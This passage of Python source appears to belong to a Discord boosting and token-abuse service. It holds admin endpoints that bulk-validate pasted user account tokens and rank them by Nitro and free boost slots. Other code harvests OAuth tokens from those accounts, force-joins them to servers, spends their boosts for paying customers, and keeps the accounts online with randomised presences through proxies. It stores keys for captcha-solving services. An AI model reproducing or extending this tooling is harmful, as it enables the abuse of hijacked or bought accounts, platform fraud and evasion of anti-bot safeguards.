                    result["oauth_token"] = False
                    result["steps"]["oauth"] = {"ok": False, "msg": "Could not get OAuth token — check bot_client_id/secret and redirect URI in config.json"}
        except Exception as e:
            result["steps"]["oauth"] = {"ok": False, "msg": f"OAuth exception: {e}"}

        # ── Step 4: Join server (only if guild_id provided) ───────────────
        if guild_id and at and user_id:
            try:
                joined_ok = add_member_to_guild(guild_id, user_id, at)
                result["joined"] = joined_ok
                if joined_ok:
                    result["steps"]["join"] = {"ok": True, "msg": f"Successfully joined guild {guild_id}"}
                else:
                    result["steps"]["join"] = {"ok": False, "msg": f"Bot could not add to guild {guild_id} — make sure the bot is in that server"}
            except Exception as e:
                result["joined"] = False
                result["steps"]["join"] = {"ok": False, "msg": f"Join exception: {e}"}
        elif guild_id and not at:
            result["joined"] = False
            result["steps"]["join"] = {"ok": False, "msg": "Skipped — no OAuth token available"}
        elif guild_id and not user_id:
            result["joined"] = False
            result["steps"]["join"] = {"ok": False, "msg": "Skipped — user_id unknown"}
        else:
            result["steps"]["join"] = {"ok": None, "msg": "Skipped — no guild ID provided"}

        # ── Step 5: Boost (only if nitro + joined + free slots) ──────────
        if result["joined"] and result["nitro"] and result["boost_slots"] > 0:
            try:
                slots_r2 = requests.get(
                    "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
                    headers=hdrs, timeout=15
                )
                slot_data = slots_r2.json() if slots_r2.status_code == 200 else []
                available_slots = [s["id"] for s in slot_data if not s.get("premium_guild_subscription")]
                if available_slots:
                    boost_r = requests.put(
                        f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",
                        json={"user_premium_guild_subscription_slot_ids": available_slots},
                        headers=hdrs, timeout=15
                    )
                    result["boosted"] = boost_r.status_code == 201
                    if result["boosted"]:
                        result["steps"]["boost"] = {"ok": True, "msg": f"Boosted with {len(available_slots)} slot(s)"}
                    else:
                        result["steps"]["boost"] = {"ok": False, "msg": f"Boost HTTP {boost_r.status_code}: {boost_r.text[:100]}"}
                else:
                    result["boosted"] = False
                    result["steps"]["boost"] = {"ok": False, "msg": "No free boost slots available"}
            except Exception as e:
                result["boosted"] = False
                result["steps"]["boost"] = {"ok": False, "msg": f"Boost exception: {e}"}
        elif result["joined"] and not result["nitro"]:
            result["steps"]["boost"] = {"ok": None, "msg": "Skipped — token has no Nitro"}
        elif result["joined"] and result["boost_slots"] == 0:
            result["steps"]["boost"] = {"ok": None, "msg": "Skipped — no free boost slots"}
        else:
            result["steps"]["boost"] = {"ok": None, "msg": "Skipped — token did not join server"}

        return result

    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, _run_test)
    return JSONResponse(res)

@app.post("/admin/api/bulk-test-tokens")
async def admin_bulk_test_tokens(request: Request, authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    body = await request.json()
    raw_tokens = body.get("tokens") or []
    guild_id_raw = str(body.get("guild_id") or "").strip()
    guild_id = re.sub(r"[^0-9]", "", guild_id_raw.replace("https://discord.com/channels/","").split("/")[0]) if guild_id_raw else ""

    if not raw_tokens or not isinstance(raw_tokens, list):
        return JSONResponse({"error": "tokens list required"}, status_code=400)
    raw_tokens = [t.strip() for t in raw_tokens if t.strip()][:100]  # cap at 100

    def _check_one(raw_token: str) -> dict:
        parts = raw_token.split(":")
        token = parts[2].strip() if len(parts) >= 3 else raw_token.strip()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        hdrs = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        out = {
            "token": token,
            "raw": raw_token,
            "token_preview": (token[:18] + "..." + token[-6:]) if len(token) > 24 else token,
            "valid": False,
            "username": None,
            "user_id": None,
            "nitro": False,
            "boost_slots": 0,
            "boost_slots_used": 0,
            "verified": False,
            "phone": False,
            "oauth_token": False,
            "joined": None,
            "status": "invalid",
            "error": None,
        }
        # Step 1: validate
        try:
            me = requests.get("https://discord.com/api/v9/users/@me", headers=hdrs, timeout=15)
            if me.status_code == 401:
                try:
                    bj = me.json(); code = bj.get("code", 0)
                    msgs = {40002:"needs-verification", 40007:"locked", 40014:"disabled"}
                    out["status"] = msgs.get(code, "invalid")
                    out["error"] = msgs.get(code, "Invalid token")
                except Exception:
                    out["status"] = "invalid"; out["error"] = "Invalid token"
                return out
            if me.status_code == 429:
                out["status"] = "rate-limited"; out["error"] = "Rate limited"
                return out
            if me.status_code != 200:
                out["status"] = "invalid"; out["error"] = f"HTTP {me.status_code}"
                return out
            me_data = me.json()
            out["valid"] = True
            uname = me_data.get("username",""); disc = me_data.get("discriminator","0")
            out["username"] = f"{uname}#{disc}" if disc and disc != "0" else uname
            out["user_id"] = me_data.get("id")
            out["verified"] = me_data.get("verified", False)
            out["phone"] = bool(me_data.get("phone"))
        except Exception as e:
            out["status"] = "error"; out["error"] = str(e); return out

        # Step 2: nitro
        try:
            slots_r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=hdrs, timeout=15)
            if slots_r.status_code == 200:
                sd = slots_r.json()
                avail = [s for s in sd if not s.get("premium_guild_subscription")]
                used  = [s for s in sd if s.get("premium_guild_subscription")]
                out["nitro"] = len(sd) > 0
                out["boost_slots"] = len(avail)
                out["boost_slots_used"] = len(used)
        except Exception:
            pass

        # Step 3: oauth
        try:
            at = get_stored_oauth_token(token)
            if not at:
                at, _ = get_oauth_token_from_user(token)
                if at and out["user_id"]:
                    store_oauth_token(token, out["user_id"], at)
            out["oauth_token"] = bool(at)
        except Exception:
            pass

        # Step 4: join guild (if guild_id given and we have oauth)
        if guild_id and out["oauth_token"] and out["user_id"]:
            try:
                ok = add_member_to_guild(guild_id, out["user_id"], at)
                out["joined"] = ok
            except Exception:
                out["joined"] = False

        # Categorise
        if out["nitro"] and out["boost_slots"] > 0:
            out["status"] = "nitro"
        elif out["valid"]:
            out["status"] = "valid"
        return out

    import concurrent.futures
    loop = asyncio.get_event_loop()
    def _run_all():
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(_check_one, t) for t in raw_tokens]
            return [f.result() for f in concurrent.futures.as_completed(futures)]

    results = await loop.run_in_executor(None, _run_all)

    # Sort: nitro first, then valid, then rest
    order = {"nitro": 0, "valid": 1, "locked": 2, "needs-verification": 3, "disabled": 4, "rate-limited": 5, "invalid": 6, "error": 7}
    results.sort(key=lambda r: order.get(r["status"], 9))

    summary = {
        "total": len(results),
        "valid": sum(1 for r in results if r["valid"]),
        "nitro": sum(1 for r in results if r["nitro"]),
        "boost_slots": sum(r["boost_slots"] for r in results),
        "invalid": sum(1 for r in results if not r["valid"]),
        "locked": sum(1 for r in results if r["status"] in ("locked","needs-verification","disabled")),
        "joined": sum(1 for r in results if r["joined"]),
    }
    return JSONResponse({"summary": summary, "results": results})


@app.get("/admin/api/secrets")
async def admin_get_secrets(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)

    def _src(key: str) -> str:
        if os.environ.get(key): return "env"
        if _secrets.get(key):   return "secrets_file"
        return "not_set"

    def _mask(val: str) -> str:
        if not val: return ""
        if len(val) <= 8: return "********"
        return val[:4] + "****" + val[-4:]

    fields = [
        ("BOT_TOKEN",          "Bot Token",             _secret("BOT_TOKEN")),
        ("BOT_CLIENT_SECRET",  "OAuth Client Secret",   _secret("BOT_CLIENT_SECRET")),
        ("WEBHOOK_URL",        "Webhook URL",            _secret("WEBHOOK_URL")),
        ("PANEL_PASSWORD",     "Panel Password",         _secret("PANEL_PASSWORD")),
        ("CHECKER_PASSWORD",   "Token Checker Password", _secret("CHECKER_PASSWORD")),
        ("CAPSOLVER_API_KEY",  "CapSolver API Key",      _secret("CAPSOLVER_API_KEY")),
        ("VOIDSOLVER_API_KEY", "VoidSolver API Key",     _secret("VOIDSOLVER_API_KEY")),
        ("ANTICAPTCHA_API_KEY","AntiCaptcha API Key",    _secret("ANTICAPTCHA_API_KEY")),
        ("KOVASOLVER_API_KEY", "KovaSolver API Key",     _secret("KOVASOLVER_API_KEY")),
        ("SELLPASS_API_KEY",   "Sellpass API Key",       _secret("SELLPASS_API_KEY")),
    ]

    return JSONResponse({
        "fields": [
            {
                "key":    k,
                "label":  label,
                "set":    bool(val),
                "source": _src(k),
                "masked": _mask(val),
            }
            for k, label, val in fields
        ]
    })


@app.post("/admin/api/secrets")
async def admin_save_secrets(request: Request, authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    body = await request.json()
    updates = body.get("secrets") or {}
    if not isinstance(updates, dict):
        return JSONResponse({"error": "secrets must be an object"}, status_code=400)

    ALLOWED = {
        "BOT_TOKEN", "BOT_CLIENT_SECRET", "WEBHOOK_URL", "PANEL_PASSWORD",
        "CHECKER_PASSWORD", "CAPSOLVER_API_KEY", "VOIDSOLVER_API_KEY",
        "ANTICAPTCHA_API_KEY", "KOVASOLVER_API_KEY", "SELLPASS_API_KEY",
    }

    global _secrets
    current = _load_secrets_file()
    changed = []
    for key, val in updates.items():
        if key not in ALLOWED:
            continue
        val = str(val).strip()
        if val:
            current[key] = val
            changed.append(key)
        elif key in current:
            del current[key]
            changed.append(key)

    _save_secrets_file(current)
    _secrets = current
    _apply_secrets_to_config()

    return JSONResponse({"ok": True, "updated": changed,
                         "message": f"Saved {len(changed)} secret(s). Some changes (e.g. bot token) need a restart to take full effect."})


@app.post("/admin/api/manual-boost")
async def admin_manual_boost(request: Request, authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
        raw_invite = str(body.get("invite", "")).strip()
        months = int(body.get("months", 1))
        amount = int(body.get("amount", 2))
        custom_bio  = str(body.get("bio",  "") or "").strip() or None
        custom_nick = str(body.get("nick", "") or "").strip() or None
    except Exception:
        return JSONResponse({"error": "Invalid request body"}, status_code=400)

    if not raw_invite:
        return JSONResponse({"error": "invite is required"}, status_code=400)
    if months not in (1, 3):
        return JSONResponse({"error": "months must be 1 or 3"}, status_code=400)
    if amount < 2 or amount % 2 != 0:
        return JSONResponse({"error": "amount must be a positive even number"}, status_code=400)

    guild_id = raw_invite.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("https://discord.com/channels/", "").split("/")[0]

    if not check_guild_accessible(guild_id):
        return JSONResponse({"error": f"Bot is not in guild '{guild_id}'. Add the bot first."}, status_code=400)

    filename = "data/1m.txt" if months == 1 else "data/3m.txt"
    tokens_stock = getStock(filename)
    required = int(amount / 2)

    if required > len(tokens_stock):
        return JSONResponse({"error": f"Not enough stock. Need {required}, have {len(tokens_stock)}."}, status_code=400)

    job_id = str(_uuid.uuid4())[:8]
    _boost_jobs[job_id] = {"status": "running"}

    wh_log(
        "🔧 Manual Boost Started — Admin Panel",
        f"**Guild:** `{guild_id}`\n**Amount:** {amount} boosts ({months}m)\n**Job ID:** `{job_id}`\n**Custom Nick:** {custom_nick or 'default'}\n**Custom Bio:** {custom_bio or 'default'}",
        color=0x3b82f6
    )

    def _run_manual():
        tokens = []
        for x in range(required):
            tokens.append(tokens_stock[x])
            remove(tokens_stock[x], filename)
        start = time.time()
        boost = Booster()
        status = boost.thread(guild_id, tokens)
        time_taken = round(time.time() - start, 2)
        wh_log(
            "✅ Manual Boost Complete — Admin Panel",
            f"**Guild:** `{guild_id}`\n**Success:** {len(status['success'])*2} boosts\n**Failed:** {len(status['failed'])*2}\n**Time:** {time_taken}s",
            color=0x22c55e
        )
        try:
            if config['auto_config']['Use_customization']:
                boost.humanizerthread(tokens=status['success'], custom_bio=custom_bio, custom_nick=custom_nick)
        except Exception:
            pass
        _boost_jobs[job_id] = {
            "status": "done",
            "success": len(status["success"]) * 2,
            "failed": len(status["failed"]) * 2,
            "captcha": len(status["captcha"]) * 2,
            "time_taken": time_taken
        }

    threading.Thread(target=_run_manual, daemon=True).start()
    return JSONResponse({"success": True, "job_id": job_id, "message": "Manual boost started"})


@app.post("/admin/api/bot-restart")
async def admin_bot_restart(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    import threading, signal as _signal, os as _os
    def _do_restart():
        import time as _t
        _t.sleep(0.5)
        _os.kill(_os.getpid(), _signal.SIGTERM)
    threading.Thread(target=_do_restart, daemon=True).start()
    return JSONResponse({"ok": True, "message": "Bot is restarting…"})


@app.get("/admin/api/oauth-status")
async def admin_oauth_status(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)

    oauth_cache = db.get_all_oauth()
    now = time.time()
    results = {"1m": [], "3m": []}

    for label in ("1m", "3m"):
        lines = db.get_all_token_lines_db(label)
        for line in lines:
            raw = line.split(":")[2].strip() if line.count(":") >= 2 else line.strip()
            entry = oauth_cache.get(raw)
            has_oauth = False
            expires_in = None
            if entry:
                obtained = entry.get("obtained_at", 0)
                age = now - obtained
                if age < 518400:
                    has_oauth = True
                    expires_in = max(0, int(518400 - age))
            preview = raw[:20] + "…" + raw[-6:] if len(raw) > 26 else raw
            results[label].append({
                "line": line,
                "token_preview": preview,
                "has_oauth": has_oauth,
                "expires_in": expires_in,
                "user_id": entry.get("user_id") if entry else None,
            })

    total     = len(results["1m"]) + len(results["3m"])
    authed    = sum(1 for t in results["1m"] + results["3m"] if t["has_oauth"])
    missing   = total - authed

    return JSONResponse({
        "total": total,
        "authed": authed,
        "missing": missing,
        "tokens": results,
    })

@app.post("/admin/api/oauth-reauth")
async def admin_oauth_reauth(authorization: str = _Header(None)):
    if not _check_admin(authorization):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)

    oauth_cache = db.get_all_oauth()
    now = time.time()
    missing_lines = []
    for label in ("1m", "3m"):
        for line in db.get_all_token_lines_db(label):
            raw = line.split(":")[2].strip() if line.count(":") >= 2 else line.strip()
            entry = oauth_cache.get(raw)
            if not entry or (now - entry.get("obtained_at", 0)) >= 518400:
                missing_lines.append(line)

    if not missing_lines:
        return JSONResponse({"ok": True, "queued": 0, "message": "All tokens already have valid OAuth tokens."})

    # Run re-auth in background thread
    def _do_reauth():
        authorize_tokens_batch(missing_lines)
    threading.Thread(target=_do_reauth, daemon=True).start()

    return JSONResponse({"ok": True, "queued": len(missing_lines), "message": f"Re-authorization started for {len(missing_lines)} token(s) in background."})

# ── End Admin Panel Routes ─────────────────────────────────────────────────────

# onliner start
class Status(Enum):
    ONLINE = "online"
    DND = "dnd"
    IDLE = "idle"

class Activity(Enum):
    GAME = 0  
    STREAMING = 1 
    LISTENING = 2 
    WATCHING = 3 
    CUSTOM = 4 
    COMPETING = 5  

class OPCodes(Enum):
    Dispatch = 0  
    Heartbeat = 1
    Identify = 2  
    PresenceUpdate = 3  
    VoiceStateUpdate = 4  
    Resume = 6  
    Reconnect = 7  
    RequestGuildMembers = (
        8  
    )
    InvalidSession = 9 
    Hello = (
        10 
    )
    HeartbeatACK = 11 

class DiscordIntents(IntEnum):
    GUILDS = 1 << 0
    GUILD_MEMBERS = 1 << 1
    GUILD_MODERATION = 1 << 2
    GUILD_EMOJIS_AND_STICKERS = 1 << 3
    GUILD_INTEGRATIONS = 1 << 4
    GUILD_WEBHOOKS = 1 << 5
    GUILD_INVITES = 1 << 6
    GUILD_VOICE_STATES = 1 << 7
    GUILD_PRESENCES = 1 << 8
    GUILD_MESSAGES = 1 << 9
    GUILD_MESSAGE_REACTIONS = 1 << 10
    GUILD_MESSAGE_TYPING = 1 << 11
    DIRECT_MESSAGES = 1 << 12
    DIRECT_MESSAGE_REACTIONS = 1 << 13
    DIRECT_MESSAGE_TYPING = 1 << 14
    MESSAGE_CONTENT = 1 << 15
    GUILD_SCHEDULED_EVENTS = 1 << 16
    AUTO_MODERATION_CONFIGURATION = 1 << 20
    AUTO_MODERATION_EXECUTION = 1 << 21

class Presence:
    def __init__(self, online_status: Status) -> None:
        self.online_status: Status = online_status
        self.activities: List[Activity] = []

    def addActivity(
        self, name: str, activity_type: Activity, url: Optional[str]
    ) -> int:
        self.activities.append(
            {
                "name": name,
                "type": activity_type.value,
                "url": url if activity_type == Activity.STREAMING else None,
            }
        )
        return len(self.activities) - 1

    def removeActivity(self, index: int) -> bool:

        if index < 0 or index >= len(self.activities):
            return False
        self.activities.pop(index)
        return True

class DiscordWebSocket:
    def __init__(self) -> None:
        try:
            proxy_line = db.get_random_proxy()
            if not proxy_line:
                raise ValueError("no proxy")
            self.websocket_instance = ws_sync_connect(
                "wss://gateway.discord.gg/?v=10&encoding=json",
                additional_headers={"Proxy-Authorization": proxy_line}
            )
        except:
            self.websocket_instance = ws_sync_connect(
                "wss://gateway.discord.gg/?v=10&encoding=json"
            )

        self.heartbeat_counter = 0

        self.username: str = None
        self.required_action: str = None
        self.heartbeat_interval: int = None
        self.last_heartbeat: float = None

    def get_heatbeat_interval(self) -> None:
        resp: Dict = json.loads(self.websocket_instance.recv())
        self.heartbeat_interval = resp["d"]["heartbeat_interval"]

    def authenticate(self, token: str, rich: Presence) -> Union[Dict, bool]:
        self.websocket_instance.send(
            json.dumps(
                {
                    "op": OPCodes.Identify.value, 
                    "d": {
                        "token": token, 
                        "intents": DiscordIntents.GUILD_MESSAGES
                        | DiscordIntents.GUILDS,  
                        "properties": {
                            "os": "linux",
                            "browser": "Brave", 
                            "device": "Desktop", 
                        },
                        "presence": {
                            "activities": [
                                activity for activity in rich.activities
                            ],
                            "status": rich.online_status.value, 
                            "since": time.time(), 
                            "afk": False, 
                        },
                    },
                }
            )
        )
        try:
            resp = json.loads(self.websocket_instance.recv())
            self.username: str = resp["d"]["user"]["username"]
            self.required_action = resp["d"].get("required_action")
            self.heartbeat_counter += 1
            self.last_heartbeat = time.time()

            return resp
        except ConnectionClosedError:
            return False

    def send_heartbeat(self) -> websockets.typing.Data:
        self.websocket_instance.send(
            json.dumps(
                {"op": OPCodes.Heartbeat.value, "d": None}
            ) 
        )

        self.heartbeat_counter += 1
        self.last_heartbeat = time.time()

        resp = self.websocket_instance.recv()
        return resp
def main(token: str, activity: Presence):
    socket = DiscordWebSocket()
    socket.get_heatbeat_interval()

    auth_resp = socket.authenticate(token, activity)
    if not auth_resp:
        return
    while True:
        try:
            if (
                time.time() - socket.last_heartbeat
                >= (socket.heartbeat_interval / 1000) - 5
            ): 
                resp = socket.send_heartbeat()
            time.sleep(0.5)
        except IndentationError:
            print(resp)
def onliner(t=None):
    try:
        global tokens
        global encountered_tokens
        tokens = []
        encountered_tokens = set() 
        if t == None:
            all_lines = db.get_all_token_lines_db("1m") + db.get_all_token_lines_db("3m")
            for token in all_lines:
                if "@" in token:
                    new_token = token.split(':')[2]
                    if new_token not in encountered_tokens:
                        tokens.append(new_token)
                        encountered_tokens.add(new_token)
                else:
                    if token not in encountered_tokens:
                        tokens.append(token)
                        encountered_tokens.add(token)
        else:
            encountered_tokens = t                       


        print(f"")

        with open("config/onliner.json", "r") as config_file:
            config: Dict[str, Union[List[str], Dict[str, List[str]]]] = json.loads(config_file.read())

        activity_types: List[Activity] = [
            Activity[x.upper()] for x in config["choose_random_activity_type_from"]
        ]
        online_statuses: List[Status] = [
            Status[x.upper()] for x in config["choose_random_online_status_from"]
        ]
    except KeyError:
        print("Invalid onliner config! Exiting...")
        exit()

    thrds = []    
    for token in encountered_tokens:
        online_status = random.choice(online_statuses)
        chosen_activity_type = random.choice(activity_types)
        url = None

        if chosen_activity_type == Activity.GAME:
            name = random.choice(config["game"]["choose_random_game_from"])
        elif chosen_activity_type == Activity.STREAMING:
            name = random.choice(config["streaming"]["choose_random_name_from"])
            url = random.choice(config["streaming"]["choose_random_url_from"])
        elif chosen_activity_type == Activity.LISTENING:
            name = random.choice(config["listening"]["choose_random_name_from"])
        elif chosen_activity_type == Activity.WATCHING:
            name = random.choice(config["watching"]["choose_random_name_from"])
        elif chosen_activity_type == Activity.CUSTOM:
            name = random.choice(config["custom"]["choose_random_name_from"])   
        elif chosen_activity_type == Activity.COMPETING:
            name = random.choice(config["competing"]["choose_random_name_from"])


        activity = Presence(online_status)
        activity.addActivity(activity_type=chosen_activity_type, name=name, url=url)

        x = Thread(target=main, args=(token, activity))
        thrds.append(x)
        x.start()
#onliner end
def start_bot():
    while True:
        try:
            bot.run(config["token"], reconnect=True)
        except Exception as e:
            logging.error(f"Bot disconnected (error: {e}). Reconnecting in 5 seconds...")
            time.sleep(5)


def validate_tokens_startup():
    total_checked = 0
    total_removed = 0
    lock = threading.Lock()

    for label in ("1m", "3m"):
        lines = db.get_all_token_lines_db(label)

        if not lines:
            logging.info(f"[Token Validation] {label}: no tokens to check")
            continue

        valid_lines = []
        removed_lines = []
        removed_count = 0

        def check_token(line, _label=label):
            nonlocal total_checked, total_removed, removed_count
            raw_token = line.split(":")[2] if line.count(":") >= 2 else line
            try:
                resp = requests.get(
                    "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
                    headers={
                        "Authorization": raw_token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    },
                    timeout=10,
                )
                with lock:
                    total_checked += 1
                    if resp.status_code == 200:
                        valid_lines.append(line)
                    else:
                        removed_lines.append(line)
                        removed_count += 1
                        total_removed += 1
                        logging.warning(f"[Token Validation] {_label} token invalid (HTTP {resp.status_code}) — removed")
            except Exception:
                with lock:
                    total_checked += 1
                    valid_lines.append(line)

        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(check_token, lines)

        for line in removed_lines:
            t = line.split(":")[2] if line.count(":") >= 2 else line
            db.remove_db(t.strip(), label)

        logging.info(f"[Token Validation] {label}: {len(valid_lines)} valid, {removed_count} invalid/expired removed")

    logging.info(f"[Token Validation] Done — {total_checked} checked, {total_removed} removed total")

    all_valid = db.get_all_token_lines_db("1m") + db.get_all_token_lines_db("3m")
    if all_valid:
        logging.info(f"[OAuth Pre-Auth] Starting OAuth pre-authorization for {len(all_valid)} tokens...")
        authorize_tokens_batch(all_valid)

    if total_removed > 0 and webhook_url != "" and use_log:
        try:
            embed = DiscordEmbed(
                title="Token Validation Report",
                description=(
                    f"**Startup token check complete**\n"
                    f"`Tokens checked:` {total_checked}\n"
                    f"`Invalid/expired removed:` {total_removed}"
                ),
                color=0xff6600,
            )
            send_webhook_message(webhook_url, "", embed)
        except Exception:
            pass

def start_bot_thread():
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.start()

if __name__ == "__main__":
    validation_thread = threading.Thread(target=validate_tokens_startup, daemon=True)
    validation_thread.start()
    if oconfig['use_onliner']:
        onliner_thread = threading.Thread(target=onliner, daemon=True)
        onliner_thread.start()
    start_bot_thread()
    port = int(os.environ.get("PORT", config.get('port', 5000)))
    run("__main__:app", host="0.0.0.0", port=port)